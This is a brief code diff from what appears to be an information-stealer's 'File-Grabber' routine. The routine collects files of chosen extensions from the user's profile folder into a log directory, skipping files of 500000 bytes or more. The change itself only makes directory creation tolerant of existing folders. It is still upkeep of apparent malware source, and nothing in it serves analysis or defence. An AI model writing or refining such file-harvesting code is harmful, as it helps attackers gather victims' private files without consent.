@@ -15,7 +15,7 @@ def Copy(fileList, user, extension, count):
             fname = fileList[i][num+1:]
             size = getsize(fileList[i])
             try:
-                makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}')
+                makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}', exist_ok=True)
             except:
                 pass
             if size < 500000:
@@ -30,7 +30,7 @@ def Grab():
     try:
         user = environ['USERPROFILE']
         try:
-            makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber')
+            makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber', exist_ok=True)
         except:
             pass
         try:
